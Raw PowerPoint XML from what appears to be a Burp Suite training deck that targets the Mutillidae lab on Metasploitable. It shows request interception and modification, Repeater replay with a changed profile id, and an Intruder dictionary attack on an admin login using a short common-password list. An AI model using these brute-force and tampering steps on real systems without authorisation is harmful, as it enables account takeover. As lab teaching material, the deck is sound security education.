                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Before forwarding the request, change any parameter or header.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7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Example modification: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7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Original </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>requaest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
              <a:latin typeface="Arial Unicode MS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chemeClr val="accent4">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>GET / HTTP/1.1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>Host: example.com</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>User-Agent: Mozilla/5.0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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Modified request:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
              <a:latin typeface="Arial Unicode MS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FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>GET /test HTTP/1.1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>Host: example.com</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>User-Agent: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>BurpSuiteTraining</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Arial Unicode MS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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Forward</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> to send the modified request to the server.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163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4" y="0"/>
            <a:ext cx="12163426" cy="6740434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:no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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1️ Create an Account (Generate a Login Request</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)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Open:</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="17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http://&lt;metasploitable-ip&gt;/mutillidae</a:t>
            </a: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7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Click:</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="17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Login/Register</a:t>
            </a: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7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Register a user (example):</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="17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username: intern1</a:t>
            </a:r>
            <a:b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password: 123456</a:t>
            </a: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7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kumimoji="0" lang="en-US" altLang="en-US" sz="17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Keep Burp Intercept ON</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="17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Burp will capture something like:</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="17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POST /</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="17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mutillidae</a:t>
            </a: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/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="17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index.php?page</a:t>
            </a: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kumimoji="0" lang="en-US" altLang="en-US" sz="17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register.php</a:t>
            </a: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HTTP/1.1</a:t>
            </a:r>
            <a:b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Host: 192.168.x.x</a:t>
            </a:r>
            <a:b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Content-Type: application/x-www-form-</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="17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urlencoded</a:t>
            </a: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/>
            </a:r>
            <a:b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/>
            </a:r>
            <a:b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username=intern1&amp;password=123456&amp;confirm_password=123456</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="17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7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700" dirty="0" smtClean="0"/>
              <a:t>Modify username</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" smtClean="0"/>
              <a:t>• Modify password</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" smtClean="0"/>
              <a:t>• Change parameters before forwarding</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="17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631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0"/>
            <a:ext cx="11051177" cy="675349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 smtClean="0"/>
              <a:t>Intercept and modify </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Login </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>Request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After the account is created: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Go to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Login page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Enter credentials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Burp intercepts request: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Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="18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POST /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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mutillidae</a:t>
            </a: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/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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index.php?page</a:t>
            </a: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altLang="en-US" sz="18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login.php</a:t>
            </a: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HTTP/1.1</a:t>
            </a:r>
            <a:b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Host: 192.168.x.x</a:t>
            </a:r>
            <a:b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Content-Type: application/x-www-form-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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urlencoded</a:t>
            </a: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/>
            </a:r>
            <a:b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/>
            </a:r>
            <a:b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username=intern1&amp;password=123456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Now </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US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you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can modify it.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Example modification:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="18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username=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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admin&amp;password</a:t>
            </a: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=admin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Click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Forward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457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="5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96098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508997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  <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Troubleshooting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Verify proxy listener is running (127.0.0.1:8080)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Ensure </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>FoxyProxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> profile is enabled</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Try visiting an HTTP site first instead of HTTPS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Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Part 3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Repeater</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to replay requests and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Intruder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> for simple dictionary attacks.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> 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Step 1 — Send a Request to Repeater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/>
              <a:t> Intercept a request in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>
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Burp Suite → Proxy → Intercept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Right-click the captured request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30049" y="0"/>
            <a:ext cx="5046807" cy="58584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Select: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Send to Repeater</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Open </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Burp Suite → Repeater tab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 The intercepted request will appear </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>there.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example request:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET / HTTP/1.1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Host: example.com</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>User-Agent: Mozilla/5.0</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Accept: text/html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194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0398034" cy="70147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5147D1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 2 — Replay the Request Using Repeater</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="5147D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7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Click the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Send</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> button in Repeater.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Burp will resend the same request to the server.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7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>You can modify values before sending.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7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example modification: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7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Original request: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7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GET /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>profile?id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=1 HTTP/1.1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Host: example.com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7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Modified request: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7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GET /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>profile?id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=2 HTTP/1.1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Host: example.com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2060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Send</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t> again to observe the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>server response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.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2060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>This allows testing how the application </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>behaves </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>when </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>parameters are changed manually</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p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894222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0358846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</a:rPr>
              <a:t>Step 3 — Send Request to Intruder</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0">
              <a:solidFill>
                <a:srgbClr val="002060"/>
              </a:solidFill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sz="1900" dirty="0"/>
              <a:t>Intercept a request again in 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900" b="1" dirty="0"/>
              <a:t>Proxy → Intercept</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> Right-click the request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900" dirty="0"/>
              <a:t>Select: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1900" dirty="0"/>
              <a:t>Send to Intruder</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Open </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Burp Suite → Intruder tab</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0">
              <a:solidFill>
                <a:srgbClr val="CC2E97"/>
              </a:solidFill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rgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 4 — Configure Intruder Attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900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1900" dirty="0"/>
              <a:t>Go to the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>Positions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> tab</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Select the parameter you want to test.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Example request:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>POST /login HTTP/1.1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Host: example.com</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Content-Type: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0"/>
              <a:t>application/x-www-form-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1" smtClean="0"/>
              <a:t>urlencoded</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>username=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>admin&amp;password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>=123</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Highlight the value </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>123</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> and click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>Add §</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> to mark it as a payload position.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Example payload position:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>username=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>admin&amp;password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>=§123§</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1699749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572" y="28575"/>
            <a:ext cx="10580914" cy="68294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b="1" dirty="0"/>
              <a:t>Step 5 Configure a Simple Dictionary Attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Go to the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>Payloads tab</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>Simple list</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> as payload type</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Add password list such as:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>123456</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>password</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>admin</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>admin123</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>welcome</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>Step 6 Start the Attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>Start Attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Burp Intruder will send multiple requests using the</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>payload list.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Example attempts: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1900" dirty="0"/>
              <a:t>username=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>admin&amp;password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>=123456</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>username=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>admin&amp;password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>=password</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>username=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>admin&amp;password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>=admin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19808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692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 dirty="0"/>
              <a:t>Expected Result</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
